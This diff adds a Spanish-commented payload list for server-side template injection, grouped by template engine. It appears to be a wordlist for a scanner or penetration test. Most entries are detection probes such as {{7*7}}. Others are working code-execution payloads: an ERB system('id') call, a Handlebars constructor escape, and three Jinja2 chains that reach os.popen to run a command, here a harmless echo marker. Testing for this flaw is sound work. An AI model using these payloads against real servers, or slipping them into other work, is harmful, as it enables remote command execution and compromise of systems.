@@ -1,0 +1,39 @@
+# SSTI Payloads — Prueba de diferentes motores de templates
+# Se espera que el resultado matemático aparezca en la respuesta
+# Template Engine: Jinja2 / Twig / Django
+{{7*7}}
+{{7*'7'}}
+{{7^7}}
+{% if 1==1 %}SI{% endif %}
+{{config}}
+{{self.__class__.__mro__}}
+# Template Engine: Freemarker (Java)
+${7*7}
+${7*'7'}
+#{7*7}
+*{7*7}
+# Template Engine: Velocity (Java)
+$!{7*7}
+# Template Engine: Jade / Pug
+#{7*7}
+# Template Engine: Smarty (PHP)
+{$smarty.version}
+{7*7}
+# Template Engine: ERB (Ruby)
+<%= 7*7 %>
+<%= system("id") %>
+# Template Engine: Tornado (Python)
+{{7*7}}
+# Template Engine: Handlebars / Mustache (JS)
+{{7*7}}
+{{constructor.constructor('return 7*7')()}}
+# Template Engine: EL Expression (Java)
+${7*7}
+# Template Engine: Thymeleaf (Java)
+${7*7}
+# Template Engine: Pebble (Java)
+{{7*7}}
+# Template Engine: Jinja2 RCE test
+{{cycler.__init__.__globals__.os.popen('echo SESAMO_SSTI').read()}}
+{{lipsum.__globals__.os.popen('echo SESAMO_SSTI').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('echo SESAMO_SSTI').read()}}
